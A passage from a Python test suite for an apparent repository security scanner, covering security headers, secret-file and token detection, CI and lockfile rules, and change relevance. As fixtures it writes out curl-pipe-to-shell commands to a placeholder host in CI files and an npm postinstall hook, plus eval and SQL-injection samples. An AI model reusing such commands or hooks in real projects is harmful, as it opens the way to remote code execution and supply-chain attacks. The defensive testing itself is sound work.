            ),
        ):
            with self.subTest(path=path):
                code = core.javascript_code(text)
                self.assertEqual(
                    architecture.csp_observations(path, text, code), expected
                )

    def test_security_headers_count_only_accepted_literal_values(self):
        nosniff, frame = "X-Content-Type-Options", "X-Frame-Options"
        hsts, referrer = "Strict-Transport-Security", "Referrer-Policy"
        for path, text, expected in (
            (
                "server.js",
                "import helmet from 'helmet';\napp.use(helmet());\n",
                {(2, nosniff), (2, frame), (2, hsts), (2, referrer)},
            ),
            (
                "server.js",
                "const guard = require('helmet');\n"
                "app.use(guard({ hsts: false, 'frameguard': { action: 'deny' } }));\n",
                {(2, nosniff), (2, referrer)},
            ),
            (
                "server.ts",
                "import helmet from 'helmet'\napp.use(helmet.noSniff())\n"
                "app.use(helmet.frameguard())\n// app.use(helmet.hsts())\n",
                {(2, nosniff), (3, frame)},
            ),
            (
                "server.js",
                "import helmet from 'helmet';\napp.use(helmet({ ...defaults }));\n"
                "app.use(helmet(options));\napp.use(helmet.frameguard({ action: 'deny' }));\n"
                "const text = 'helmet()';\n",
                set(),
            ),
            ("server.js", "app.use(helmet());\n", set()),
            (
                "app.js",
                "res.set('x-frame-options', 'SAMEORIGIN');\n"
                "res.setHeader('Referrer-Policy', 'origin, strict-origin-when-cross-origin');\n"
                "res.set({'X-Content-Type-Options': 'nosniff'});\n",
                {(1, frame), (2, referrer), (3, nosniff)},
            ),
            (
                "app.js",
                "res.set('X-Frame-Options', 'ALLOW-FROM https://example.test');\n"
                "res.set('Referrer-Policy', 'no-referrer, unsafe-url');\n"
                "res.set('Strict-Transport-Security', 'max-age=0; includeSubDomains');\n"
                "res.set('X-Content-Type-Options', value);\n"
                "const doc = \"res.set('X-Frame-Options', 'DENY')\";\n",
                set(),
            ),
            (
                "http.test.ts",
                "assert.equal(res.headers['x-frame-options'], 'SAMEORIGIN')\n"
                "if (res.headers['X-Content-Type-Options'] === 'nosniff') {}\n",
                set(),
            ),
            (
                "headers.py",
                "response.headers['Strict-Transport-Security'] = 'includeSubDomains; max-age=63072000'\n"
                "response.set_header('X-Content-Type-Options', 'nosniff')\n"
                "response.headers['X-Frame-Options'] = frame_option\n",
                {(1, hsts), (2, nosniff)},
            ),
            (
                "site.conf",
                "add_header X-Frame-Options DENY;\n"
                'add_header X-Content-Type-Options "nosniff" always;\n'
                "# add_header Referrer-Policy no-referrer;\n",
                {(1, frame), (2, nosniff)},
            ),
        ):
            with self.subTest(path=path, text=text):
                code = (
                    core.javascript_code(text)
                    if Path(path).suffix in core.JS_EXTENSIONS
                    else text
                )
                rows = architecture.header_observations(path, text, code)
                self.assertEqual({(line, header) for line, _, header in rows}, expected)
                self.assertTrue(all(status == "satisfied" for _, status, _ in rows))

    def test_nested_helmet_calls_are_processed_in_bounded_time(self):
        text = "import helmet from 'helmet';\n" + "helmet(" * 40000 + ")" * 40000
        started = time.monotonic()
        rows = architecture.header_observations(
            "x.js", text, core.javascript_code(text)
        )
        self.assertLess(time.monotonic() - started, 2)
        self.assertEqual(len(rows), 4)  # Only the innermost call has no arguments.

    def test_security_headers_never_deduct_or_withhold_a_score(self):
        self.write("app.py", "eval(payload)\n")
        status, result, _ = self.invoke()
        self.assertEqual((status, result["score"]), (0, 59))
        self.write(
            "server.js",
            "import helmet from 'helmet';\napp.use(helmet.noSniff());\n"
            "app.use(helmet.frameguard());\nres.set('X-Frame-Options', config.frame);\n",
        )
        status, result, _ = self.invoke()
        self.assertEqual(
            (status, result["verdict"], result["score"]), (0, "scored", 59)
        )
        row = next(
            row
            for row in result["checks"]
            if row["rule"] == "WEB-HEADERS" and row["file"] == "server.js"
        )
        self.assertEqual(row["status"], "satisfied")
        self.assertEqual(
            [(item["line"], item["detail"]) for item in row["locations"]],
            [(2, "X-Content-Type-Options"), (3, "X-Frame-Options")],
        )
        self.assertFalse(any(f["rule"] == "WEB-HEADERS" for f in result["findings"]))
        frontend = topic_block(cli.render(result, details=True), "Frontend")
        self.assertRegex(frontend, r"^Frontend\s+not assessed")
        self.assertRegex(
            frontend,
            r"(?m)^  OK\s+Security headers declared:\s+X-Content-Type-Options,\s+"
            r"X-Frame-Options\n.*WEB-HEADERS . server\.js:2 \(\+1 more\)$",
        )

    def test_positive_only_evidence_never_establishes_a_score(self):
        self.write(
            "server.js", "const helmet = require('helmet');\napp.use(helmet());\n"
        )
        self.write("SECURITY.md", "Report issues to the maintainers.\n")
        self.write("renovate.json", "{}\n")
        status, result, _ = self.invoke()
        self.assertEqual(
            (status, result["verdict"], result["score"], result["observed_score"]),
            (2, "undetermined", None, None),
        )
        details = cli.render(result, details=True)
        self.assertRegex(topic_block(details, "Frontend"), r"^Frontend\s+not assessed")
        self.assertIn("Security headers declared", details)
        self.assertIn("Security policy present", details)
        self.assertIn("Dependency update configuration present", details)
        self.write("app.py", "eval(payload)\n")
        self.assertEqual(self.invoke()[1]["score"], 59)  # Nor offsets a finding.

    def test_final_stage_user_is_positive_evidence_only(self):
        self.write("app.py", "requests.get(url, verify=True)\n")
        self.write("Dockerfile", "FROM scratch\nUSER root\n")
        status, result, _ = self.invoke()
        self.assertEqual((status, result["score"]), (0, 100))
        self.assertFalse(any(row["rule"] == "IAC-USER" for row in result["findings"]))
        self.write("Dockerfile", "FROM scratch\nUSER root\nUSER 65532\n")
        result = self.invoke()[1]
        self.assertIn(
            "Non-root container user declared", cli.render(result, details=True)
        )

    def test_secret_files_are_named_without_reading_their_content(self):
        marker = "SYNTHETIC-CONTENT-MARKER"
        self.write("app.py", "requests.get(url, verify=True)\n")
        self.write(".env", f"VALUE={marker}\n")
        self.write("deploy/id_rsa", marker)
        self.write("infra/prod.tfstate", marker)
        self.write(".env.example", "VALUE=\n")
        self.write("certs/fullchain.pem", marker)
        self.write("node_modules/package/server.key", marker)
        with mock.patch.object(
            sources, "regular_read", wraps=sources.regular_read
        ) as read:
            status, result, _ = self.invoke()
        self.assertEqual(status, 0)
        self.assertEqual(
            sorted((row["rule"], row["file"]) for row in result["findings"]),
            [
                ("SECRET-FILE", ".env"),
                ("SECRET-FILE", "deploy/id_rsa"),
                ("TF-STATE", "infra/prod.tfstate"),
            ],
        )
        self.assertEqual(result["score"], 55)  # 10 + 10 + 25 points in one area.
        self.assertEqual({call.args[1] for call in read.call_args_list}, {"app.py"})
        self.assertNotIn(marker, json.dumps(result))
        self.assertRegex(
            topic_block(cli.render(result, details=True), "Secrets"),
            r"^Secrets\s+55/100",
        )

    def test_gitignored_secret_files_are_not_repository_findings(self):
        self.init()
        self.write(".gitignore", ".env\n")
        self.write(".env", "VALUE=1\n")
        result = self.invoke()[1]
        self.assertFalse(
            any(row["rule"] == "SECRET-FILE" for row in result["findings"])
        )

    def test_secret_values_never_reach_the_result(self):
        token = "ghp_" + "0123456789abcdefghijABCDEFGHIJ012345"
        self.write("config.py", f"TOKEN = '{token}'\n")
        self.write("broken.py", f"def (\nTOKEN = '{token}'\n")  # Unparseable source.
        self.write("settings.yml", f"token: {token}\n")
        _, result, _ = self.invoke()
        self.assertEqual(
            sorted(
                (row["file"], row["line"])
                for row in result["findings"]
                if row["rule"] == "SECRET-TOKEN"
            ),
            [("broken.py", 2), ("config.py", 1), ("settings.yml", 1)],
        )
        self.assertNotIn(token, json.dumps(result))
        self.assertNotIn(token, cli.render(result, details=True))
        for finding in result["findings"]:
            self.assertNotIn("_identity", finding)

    def test_secret_change_is_reported_without_the_value(self):
        token = "glpat-" + "0123456789abcdefghijKLMN"
        self.init()
        self.write("app.py", f"TOKEN = '{token}'\n")
        status, result, _ = self.invoke("--worktree")
        self.assertEqual(status, 0)
        self.assertEqual(result["relevance"], "high")
        self.assertEqual(
            [(row["rule"], row["change"]) for row in result["findings"]],
            [("SECRET-TOKEN", "introduced")],
        )
        self.assertNotIn(token, json.dumps(result))

    def test_ci_downloads_and_gitlab_pinning_are_findings(self):
        self.write("app.py", "requests.get(url, verify=True)\n")
        self.write(
            ".github/workflows/build.yml",
            "on: push\njobs:\n  build:\n    steps:\n"
            "      - uses: example/action@" + "a" * 40 + "\n"
            "      - run: |\n          curl -sSL https://example.invalid/i.sh | bash\n"
            "      - run: npm install\n",
        )
        self.write(
            ".gitlab-ci.yml",
            "image: node:latest\ninclude:\n  - project: group/ci\n    ref: main\n"
            "build:\n  script:\n    - curl https://example.invalid/i.sh | sh\n"
            '    - echo "$CI_COMMIT_MESSAGE"\n'
            "  image:\n    name: $CI_REGISTRY_IMAGE:latest\n",
        )
        result = self.invoke()[1]
        self.assertEqual(
            sorted(
                (row["rule"], row["file"], row["line"]) for row in result["findings"]
            ),
            [
                ("CI-FROZEN-INSTALL", ".github/workflows/build.yml", 8),
                ("CI-GITLAB-IMAGE", ".gitlab-ci.yml", 1),
                ("CI-GITLAB-INCLUDE", ".gitlab-ci.yml", 3),
                ("CI-REMOTE-SCRIPT", ".github/workflows/build.yml", 7),
                ("CI-REMOTE-SCRIPT", ".gitlab-ci.yml", 7),
            ],
        )

    def test_gitlab_rules_do_not_read_github_workflows(self):
        self.write(
            ".github/workflows/build.yml", "jobs:\n  a:\n    image: node:latest\n"
        )
        checks = self.invoke()[1]["checks"]
        self.assertFalse(any(row["rule"] == "CI-GITLAB-IMAGE" for row in checks))

    def test_gitlab_nested_ci_files_are_read(self):
        self.write(".gitlab/ci/build.yml", "image: node:latest\n")
        self.write("docs/.gitlab/ci/build.yml", "image: node:latest\n")
        result = self.invoke()[1]
        self.assertEqual(
            [row["file"] for row in result["findings"]], [".gitlab/ci/build.yml"]
        )

    def test_lockfile_tolerates_malformed_entries(self):
        for text in (
            "{not json",
            '{"packages":[]}',
            '{"packages":{"a":{"resolved":17},"b":null,"c":[]}}',
        ):
            with self.subTest(text=text):
                self.assertEqual(architecture.lockfile_observations(text), [])
        malformed = (
            '{"packages":{"a":{"resolved":"https://[bad","integrity":"sha512-a"}}}'
        )
        self.assertEqual(
            architecture.lockfile_observations(malformed),
            [(1, "violated")],
        )

    def test_large_yarn_lock_does_not_withhold_the_grade(self):
        self.write("app.py", "requests.get(url, verify=True)\n")
        self.write("yarn.lock", "x" * (sources.MAX_FILE + 1))
        status, result, _ = self.invoke()
        self.assertEqual(
            (status, result["verdict"], result["score"]), (0, "scored", 100)
        )

    def test_lockfile_reports_the_foreign_entry_line(self):
        lock = (
            '{\n"packages": {\n'
            '"node_modules/a": {"resolved": "https://registry.npmjs.org/a.tgz", "integrity": "x"},\n'
            '"node_modules/b": {"resolved": "https://registry.npmjs.org/b.tgz", "integrity": "x"},\n'
            '"node_modules/c": {"resolved": "https://packages.example.invalid/c.tgz", "integrity": "x"}\n'
            "}\n}\n"
        )
        self.assertEqual(
            architecture.lockfile_observations(lock),
            [(5, "violated")],
        )

    def test_private_registry_lockfile_is_not_a_foreign_host(self):
        lock = (
            '{"packages":{"a":{"resolved":"https://npm.corp.example.invalid/a.tgz","integrity":"x"},'
            '"b":{"resolved":"https://npm.corp.example.invalid/b.tgz","integrity":"x"}}}'
        )
        self.assertEqual(
            architecture.lockfile_observations(lock),
            [(1, "satisfied")],
        )

    def test_hostile_infrastructure_files_stay_bounded(self):
        cases = {
            "main.tf": 'cidr_blocks = ["0.0.0.0/0"] {\n' * 16000 + "}\n" * 16000,
            "iam.tf": 'actions = ["*"] {\n' * 20000,
            "Cargo.toml": 'git = "https://example.invalid/a.git"\n' * 14000,
            "build.gradle": "url " * 120000,
            "pom.xml": "<repository>\n" * 40000,
            ".gitlab-ci.yml": "script:\n  - " + "yarn install " * 40000 + "\n",
            "package-lock.json": json.dumps(
                {
                    "packages": {
                        str(index): {"resolved": f"http://a.invalid/{index}"}
                        for index in range(9000)
                    }
                }
            ),
        }
        for name, text in cases.items():
            with self.subTest(name=name):
                started = time.monotonic()
                with contextlib.suppress(core.ScanLimit):
                    core.scan({name: {"text": text}}, sources.Budget())
                self.assertLess(time.monotonic() - started, 10)

    def test_password_hash_follows_the_value_through_a_local_helper(self):
        self.write(
            "login.js",
            "// const stale = crypto.createHash('md5').update(password);\n"
            "function digest(value) {\n"
            "  return crypto.createHash('sha1').update(value).digest('hex');\n"
            "}\n"
            "const stored = digest(req.body.password);\n"
            "const other = digest(req.body.email);\n"
            "const remote = security.digest(req.body.password);\n",
        )
        result = self.invoke()[1]
        self.assertEqual(
            [
                (row["line"], row["rule"])
                for row in result["findings"]
                if row["rule"] == "PASSWORD-HASH"
            ],
            [(5, "PASSWORD-HASH")],
        )
        self.assertEqual(
            [
                (row["technology"], row["status"], row["line"])
                for row in result["architecture"]["password_hashing"]
            ],
            [("SHA-1", "violated", 5)],
        )

    def test_profile_reports_login_hash_deployment_and_cloud_login(self):
        self.write(
            "package.json",
            '{"dependencies":{"openid-client":"1","passport-saml":"1","bcrypt":"1"}}',
        )
        self.write(
            "login.js",
            "const digest = (value) => crypto.createHash('md5').update(value).digest('hex');\n"
            "const stored = digest(req.body.password);\n",
        )
        self.write("infra/main.tf", 'provider "aws" {}\n')
        self.write("Procfile", "web: node app.js\n")
        self.write("deployment.yaml", "kind: Deployment\n")
        self.write(
            ".github/workflows/deploy.yml",
            "jobs:\n  deploy:\n    steps:\n"
            "      - uses: google-github-actions/auth@" + "a" * 40 + "\n"
            "        with:\n          credentials_json: ${{ secrets.GCP }}\n"
            "      - uses: aws-actions/configure-aws-credentials@" + "a" * 40 + "\n"
            "        with:\n          role-to-assume: arn:example\n",
        )
        result = self.invoke()[1]
        profile = result["architecture"]
        self.assertEqual(profile["login"], "both")
        self.assertEqual(
            {row["technology"] for row in profile["deployment"]},
            {"AWS", "GCP", "Heroku", "Kubernetes", "Terraform"},
        )
        self.assertEqual(
            sorted(
                (row["technology"], row["method"]) for row in profile["cloud_login"]
            ),
            [("AWS", "oidc"), ("GCP", "stored-key")],
        )
        details = " ".join(cli.render(result, details=True).split())
        self.assertIn("SSO and passwords", details)
        self.assertIn("MD5 (login.js:2)", details)
        self.assertIn("SSO (OIDC/OAuth) (openid-client)", details)
        self.assertIn("SSO (SAML) (passport-saml)", details)
        self.assertIn("AWS: OIDC, GCP: stored key", details)
        self.assertIn("Cloud login through OIDC without a stored key: AWS", details)
        for text in ("kind: Deployment", "credentials_json"):
            self.assertNotIn(text, details)

    def test_login_configuration_without_a_package_is_recognized(self):
        self.write(
            "application.yml", "spring:\n  issuer-uri: https://id.example.invalid\n"
        )
        self.write("settings.py", "SOCIALACCOUNT_PROVIDERS = {}\n")
        self.write("auth.ts", "providers: [CredentialsProvider({})]\n")
        profile = self.invoke()[1]["architecture"]
        self.assertEqual(profile["login"], "both")
        self.assertEqual(
            sorted(
                (row["mechanism"], row["technology"])
                for row in profile["authentication"]
            ),
            [
                ("federated", "Spring OAuth2 client"),
                ("federated", "django-allauth"),
                ("local-password", "next-auth credentials"),
            ],
        )

    def test_repository_paths_skip_generated_directories(self):
        self.assertEqual(
            sources.repository_paths(
                {"app.py": {"text": ""}},
                [
                    {"file": "vendor/lib.jar", "reason": "excluded or unsupported"},
                    {"file": "lib/tool.jar", "reason": "excluded or unsupported"},
                ],
            ),
            ["app.py", "lib/tool.jar"],
        )

    def test_terraform_is_scanned_instead_of_reported_as_unsupported(self):
        self.write(
            "infra/main.tf",
            'resource "aws_db_instance" "db" {\n  publicly_accessible = true\n}\n',
        )
        status, result, _ = self.invoke()
        self.assertEqual(
            (status, result["verdict"], result["score"]), (0, "scored", 59)
        )
        self.assertFalse(
            any(row["rule"] == "SOURCE-COVERAGE" for row in result["checks"])
        )
        self.assertRegex(
            topic_block(cli.render(result, details=True), "Deployment & transport"),
            r"^Deployment & transport\s+59/100",
        )

    def test_security_header_change_is_high_relevance_without_a_finding(self):
        self.init()
        self.write("app.py", "response.headers['X-Frame-Options'] = 'DENY'\n")
        status, result, _ = self.invoke("--worktree")
        self.assertEqual(status, 0)
        self.assertEqual(result["relevance"], "high")
        self.assertEqual(result["findings"], [])
        self.assertIn(
            "REL-CONTROL-FRONTEND-POLICY",
            {signal["rule"] for signal in result["signals"]},
        )

    def test_supply_chain_declarations_and_stale_locks(self):
        lock = (
            '{"lockfileVersion":3,"packages":{"":{"dependencies":{"example":"1.0.0"}}}}'
        )
        for manifest, status in (
            ('{"dependencies":{"example":"1.0.0"}}', "satisfied"),
            ('{"dependencies":{"example":"2.0.0"}}', "unclear"),
        ):
            # The disabled NPM-LOCK detector stays correct for reactivation.
            self.assertEqual(
                architecture.npm_observations(
                    "npm-lock",
                    "package.json",
                    manifest,
                    {"package-lock.json": {"text": lock}},
                ),
                [(1, status)],
            )
        self.write(
            "package.json",
            '{"dependencies":{"example":"2.0.0"},"scripts":{"postinstall":"curl https://example.invalid/setup | sh"}}',
        )
        self.write("package-lock.json", lock)
        result = self.invoke()[1]
        self.assertIn("NPM-INSTALL", {row["rule"] for row in result["findings"]})

    def test_disabled_rules_keep_their_id_but_never_run(self):
        disabled = {
            rule["id"]
            for rule in core.POLICY["rules"]
            if rule.get("enabled", True) is False
        }
        self.assertEqual(disabled, {"NPM-LOCK"})
        self.assertFalse(disabled & {rule["id"] for rule in core.RULES})
        self.write("Dockerfile", "FROM scratch\nUSER root\n")
        self.write("package.json", '{"dependencies":{"example":"1.0.0"}}')
        result = self.invoke()[1]
        self.assertFalse(disabled & {row["rule"] for row in result["checks"]})
        with mock.patch.dict(core.POLICY["rules"][0], {"enabled": "no"}):
            with self.assertRaisesRegex(ValueError, "enabled flag"):
                core.validate_policy()
        with mock.patch.dict(core.POLICY["rules"][0], {"id": "IAC-USER"}):
            with self.assertRaisesRegex(ValueError, "unique"):
                core.validate_policy()

    def test_complete_skill_copy_runs_without_analyzer_or_packages(self):
        import shutil

        installed = self.root / "installed-skill"
        shutil.copytree(ROOT, installed)
        self.write("app.py", "eval(payload)\n")
        result = subprocess.run(
            [sys.executable, "-B", str(installed / "scripts/score.py"), str(self.repo)],
            cwd=self.root,
            env={**os.environ, "PATH": "", "PYTHONPATH": ""},
            capture_output=True,
            text=True,
            timeout=5,
        )
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(result.stdout, "59/100 (E)\n")
        self.assertIn("Reading selected sources...", result.stderr)

    def test_malformed_human_edited_catalog_fails_without_traceback(self):
        import shutil

        installed = self.root / "installed-skill"
        shutil.copytree(ROOT, installed)
        (installed / "rules.json").write_text('{"scoring_version":1,"rules":[]}')
        result = subprocess.run(
            [
                sys.executable,
                "-B",
                str(installed / "scripts/score.py"),
                "--verify-rules",
            ],
            capture_output=True,
            text=True,
            timeout=5,
        )
        self.assertEqual(result.returncode, 1)
        self.assertIn("Invalid bundled rule catalog", result.stderr)
        self.assertNotIn("Traceback", result.stderr)
        quiet = subprocess.run(
            [sys.executable, "-B", str(installed / "scripts/score.py"), "--quite"],
            capture_output=True,
            text=True,
            timeout=5,
        )
        self.assertEqual(quiet.returncode, 1)
        self.assertEqual(quiet.stdout, "")
        self.assertEqual(quiet.stderr, "")

    def test_parse_failure_keeps_other_findings_without_a_grade(self):
        self.write("app.py", "eval(payload)\n")
        self.write("broken.py", "def broken(\n")
        status, result, _ = self.invoke()
        self.assertEqual(status, 1)
        self.assertIsNone(result["grade"])
        self.assertTrue(any(row["rule"] == "PY-EXEC" for row in result["findings"]))

    def test_finding_limit_retains_available_observations(self):
        self.write("app.py", "eval(payload)\n" * 5001)
        status, result, _ = self.invoke()
        self.assertEqual(status, 1)
        self.assertEqual(len(result["findings"]), 5000)
        self.assertIsNone(result["score"])
        self.assertIsNone(result["grade"])

    def test_cancellation_does_not_publish_a_result(self):
        with mock.patch.object(cli, "run", side_effect=KeyboardInterrupt):
            status, result, errors = self.invoke()
        self.assertEqual(status, 130)
        self.assertIsNone(result)
        self.assertIn("cancelled", errors)

    def test_overlapping_patch_hunks_are_rejected(self):
        patch = self.root / "bad.diff"
        patch.write_text(
            "--- a/app.py\n+++ b/app.py\n@@ -1 +1 @@\n-old\n+eval(payload)\n@@ -1 +1 @@\n-old\n+eval(payload)\n"
        )
        self.assertEqual(self.invoke("--patch", str(patch))[0], 1)

    def test_replaced_same_count_findings_are_not_silently_pre_existing(self):
        self.init("def old_handler(payload):\n    return eval(payload)\n")
        self.write("app.py", "def new_handler(payload):\n    return eval(payload)\n")
        result = self.invoke("--worktree")[1]
        self.assertEqual(
            Counter(row["change"] for row in result["findings"]),
            {"introduced": 1, "resolved": 1},
        )
        self.assertEqual(result["relevance"], "high")
        self.assertNotIn("score", result)
        self.assertNotIn("grade", result)
        self.assertNotIn("_identity", json.dumps(result))

    def test_line_shifts_preserve_existing_observation_identity(self):
        self.init("def handler(payload):\n    return eval(payload)\n")
        self.write(
            "app.py",
            "# Extra explanation\n\ndef handler(payload):\n    return eval(payload)\n",
        )
        result = self.invoke("--worktree")[1]
        old, _ = core.scan(
            {"app.py": {"text": "def handler(payload):\n    return eval(payload)\n"}},
            sources.Budget(),
        )
        new, _ = core.scan(
            {
                "app.py": {
                    "text": "# Extra explanation\n\ndef handler(payload):\n    return eval(payload)\n"
                }
            },
            sources.Budget(),
        )
        self.assertEqual(
            [row["change"] for row in core.compare(old, new)], ["pre_existing"]
        )
        self.assertEqual(result["findings"], [])
        self.assertEqual(result["relevance"], "low")
        self.assertNotIn("score", result)
        self.assertNotIn("grade", result)

    def test_incomplete_comparison_cannot_claim_a_finding_is_resolved(self):
        self.init("eval(payload)\n")
        self.write("app.py", "def broken(\n")
        status, result, _ = self.invoke("--worktree")
        self.assertEqual(status, 1)
        self.assertEqual([row["change"] for row in result["findings"]], ["unresolved"])
        self.assertNotIn("grade", result)
        self.assertNotIn("score", result)

    def test_change_scope_recheck_detects_new_files(self):
        self.init()
        self.write("app.py", "eval(payload)\n")
        options = cli.parser().parse_args(["--repo", str(self.repo), "--worktree"])
        *_, verify = sources.select(options, sources.Budget())
        self.write("added.py", "eval(other)\n")
        with self.assertRaises(sources.SourceError):
            verify()

    def test_safe_authentication_change_is_relevant_without_a_finding(self):
        self.init("def view(user):\n    return user.name\n")
        self.write("app.py", "@login_required\ndef view(user):\n    return user.name\n")
        status, result, _ = self.invoke("--worktree")
        self.assertEqual(status, 0)
        self.assertEqual(result["relevance"], "high")
        self.assertEqual(result["findings"], [])
        self.assertIn("REL-AUTH", {row["rule"] for row in result["signals"]})
        self.assertNotIn("score", result)
        self.assertNotIn("grade", result)
        self.assertNotIn("areas", result)
        self.assertNotIn("scoring_version", result)
        self.assertEqual(result, self.invoke("--worktree")[1])

    def test_unknown_business_logic_is_not_low_just_because_no_finding_exists(self):
        self.init("def compute(value):\n    return value + 1\n")
        self.write("app.py", "def compute(value):\n    return value + 2\n")
        status, result, _ = self.invoke("--worktree")
        self.assertEqual(status, 0)
        self.assertEqual(result["verdict"], "complete")
        self.assertEqual(result["relevance"], "unclear")
        self.assertEqual(result["findings"], [])
        self.assertIn("app.py", result["coverage"]["unclassified_files"])

    def test_access_decision_change_uses_function_context_without_a_finding(self):
        source = (
            "def can_read(actor, owner):\n"
            "    actor = actor.strip()\n"
            "    owner = owner.strip()\n"
            "    actor = actor.lower()\n"
            "    owner = owner.lower()\n"
            "    return actor == owner\n"
        )
        self.init(source)
        self.write("app.py", source.replace("return actor == owner", "return True"))
        status, result, _ = self.invoke("--worktree")
        self.assertEqual(status, 0)
        self.assertEqual(result["relevance_version"], 7)
        self.assertEqual(result["relevance"], "high")
        self.assertEqual(result["findings"], [])
        self.assertTrue(
            any(
                signal["rule"] == "REL-AUTH"
                and signal["line"] == 1
                and signal["relation"] == "in changed function"
                for signal in result["signals"]
            )
        )
        self.assertNotIn("return actor", json.dumps(result))

    def test_unchanged_sibling_security_function_is_not_change_evidence(self):
        for path, before, after in (
            (
                "helpers.py",
                "def can_read(actor, owner):\n    return actor == owner\ndef compute(value):\n    return value + 1\n",
                "def can_read(actor, owner):\n    return actor == owner\ndef compute(value):\n    return value + 2\n",
            ),
            (
                "helpers.js",
                "function canRead(actor, owner) { return actor === owner; }\nfunction compute(value) { return value + 1; }\n",
                "function canRead(actor, owner) { return actor === owner; }\nfunction compute(value) { return value + 2; }\n",
            ),
        ):
            with self.subTest(path=path):
                result = relevance.analyze(
                    {path: {"text": before}},
                    {path: {"text": after}},
                    [],
                    [],
                    [],
                    sources.Budget(),
                )
                self.assertEqual(result["relevance"], "unclear")
                self.assertEqual(result["signals"], [])

    def test_supported_function_context_includes_annotations_and_arrow_handlers(self):
        for path, declaration, closing in (
            ("helpers.ts", "const canRead = (actor, owner) => {", "}"),
            (
                "Handler.java",
                '@PreAuthorize("hasRole(ADMIN)")\npublic boolean check(Actor actor) {',
                "}",
            ),
            ("Handler.cs", "[Authorize]\npublic bool Check(Actor actor) {", "}"),
            ("handler.go", "func canRead(actor string, owner string) bool {", "}"),
            ("handler.rs", "fn can_read(actor: i32, owner: i32) -> bool {", "}"),
            ("handler.kt", "fun canRead(actor: String, owner: String): Boolean {", "}"),
        ):
            with self.subTest(path=path):
                prefix = (
                    declaration + "\n  a = actor;\n  b = owner;\n  c = a;\n  d = b;\n"
                )
                result = relevance.analyze(
                    {path: {"text": prefix + "  return a == b;\n" + closing}},
                    {path: {"text": prefix + "  return true;\n" + closing}},
                    [],
                    [],
                    [],
                    sources.Budget(),
                )
                self.assertEqual(result["relevance"], "high")
                self.assertTrue(
                    any(signal["rule"] == "REL-AUTH" for signal in result["signals"])
                )

    def test_exposure_and_access_policy_configuration_indicate_review_needs(self):
        for path, before, after, rule in (
            (
                "nginx.conf",
                "listen 127.0.0.1:8080;\n",
                "listen 0.0.0.0:8080;\n",
                "REL-INTERFACE-CONFIG",
            ),
            (
                "server.properties",
                "server.address=127.0.0.1\n",
                "server.address=0.0.0.0\n",
                "REL-EXPOSURE",
            ),
            (
                "policies/document.json",
                '{"read":"owner"}',
                '{"read":"everyone"}',
                "REL-ACCESS-POLICY",
            ),
            (
                "app.py",
                "if document.owner_id != user.id:\n    raise PermissionError()\n",
                "if False:\n    raise PermissionError()\n",
                "REL-AUTH",
            ),
        ):
            for reverse in (False, True):
                with self.subTest(path=path, reverse=reverse):
                    old, new = (after, before) if reverse else (before, after)
                    result = relevance.analyze(
                        {path: {"text": old}},
                        {path: {"text": new}},
                        [],
                        [],
                        [],
                        sources.Budget(),
                    )
                    self.assertEqual(result["relevance"], "high")
                    self.assertEqual(result["findings"], [])
                    self.assertIn(
                        rule, {signal["rule"] for signal in result["signals"]}
                    )

    def test_large_function_context_is_bounded_and_reports_the_limit(self):
        for name, expected in (("can_read", "high"), ("compute", "unclear")):
            with self.subTest(name=name):
                prefix = f"def {name}(actor, owner):\n" + "    value = 1\n" * 205
                result = relevance.analyze(
                    {"helpers.py": {"text": prefix + "    return actor == owner\n"}},
                    {"helpers.py": {"text": prefix + "    return True\n"}},
                    [],
                    [],
                    [],
                    sources.Budget(),
                )
                self.assertEqual(result["relevance"], expected)
                self.assertEqual(
                    result["coverage"]["context_limited_files"], ["helpers.py"]
                )

    def test_patch_context_does_not_bridge_separate_hunks(self):
        patch = self.root / "change.diff"
        patch.write_text(
            "--- a/helpers.js\n+++ b/helpers.js\n"
            "@@ -1 +1 @@\n function canRead(actor, owner) {\n"
            "@@ -200 +200 @@\n-return first;\n+return second;\n"
        )
        status, result, _ = self.invoke("--patch", str(patch))
        self.assertEqual(status, 0)
        self.assertEqual(result["relevance"], "unclear")
        self.assertEqual(result["signals"], [])

    def test_security_names_in_comments_or_literals_do_not_indicate_changed_controls(
        self,
    ):
        result = relevance.analyze(
            {
                "helpers.js": {
                    "text": "// canRead(user, owner)\nconst label = 'authorize(user)';\nvalue = 1;\n"
                }
            },
            {
                "helpers.js": {
                    "text": "// canRead(user, owner)\nconst label = 'authorize(user)';\nvalue = 2;\n"
                }
            },
            [],
            [],
            [],
            sources.Budget(),
        )
        self.assertEqual(result["relevance"], "unclear")
        self.assertEqual(result["signals"], [])

    def test_fixing_parameterization_remains_highly_relevant(self):
        self.init('cursor.execute(f"SELECT name FROM items WHERE id={identifier}")\n')
        self.write(
            "app.py",
            'cursor.execute("SELECT name FROM items WHERE id=?", (identifier,))\n',
        )
        result = self.invoke("--worktree")[1]
        self.assertEqual(result["relevance"], "high")
        self.assertEqual(result["finding_changes"], {"resolved": 1})
        self.assertNotIn("grade", result)

    def test_ordinary_documentation_has_positive_low_relevance_evidence(self):
        self.init()
        self.write("README.md", "# Project\nAn updated example.\n")
        status, result, _ = self.invoke("--worktree")
        self.assertEqual(status, 0)
        self.assertEqual(result["relevance"], "low")
        self.assertEqual(result["findings"], [])
        self.assertIn("README.md", result["coverage"]["nonfunctional_or_documentation"])

    def test_documented_security_guidance_and_agent_instructions_are_not_plain_docs(
        self,
    ):
        self.init()
        self.write("README.md", "# Project\nAuthentication is required.\n")
        result = self.invoke("--worktree")[1]
        self.assertEqual(result["relevance"], "medium")
        self.write("AGENTS.md", "Read the project and publish the report.\n")
        result = self.invoke("--worktree")[1]
        self.assertEqual(result["relevance"], "high")
        self.assertIn(
            "REL-AGENT-INSTRUCTIONS", {row["rule"] for row in result["signals"]}
        )

    def test_dependency_update_is_relevant_without_claiming_a_vulnerability(self):
        self.init()
        self.write("package.json", '{"dependencies":{"example":"1.0.0"}}')
        self.git("add", ".")
        self.git("commit", "--no-gpg-sign", "-m", "Dependency baseline")
        self.write("package.json", '{"dependencies":{"example":"2.0.0"}}')
        self.git("add", "package.json")
        result = self.invoke("--staged")[1]
        self.assertEqual(result["relevance"], "high")
        self.assertEqual(result["findings"], [])
        self.assertIn("REL-DEPENDENCIES", {row["rule"] for row in result["signals"]})

    def test_untouched_pre_existing_weakness_elsewhere_does_not_drive_relevance(self):
        source = (
            "eval(payload)\n"
            + "\n" * 10
            + "def compute(value):\n    return value + 1\n"
        )
        self.init(source)
        self.write("app.py", source.replace("value + 1", "value + 2"))
        result = self.invoke("--worktree")[1]
        self.assertEqual(result["relevance"], "unclear")
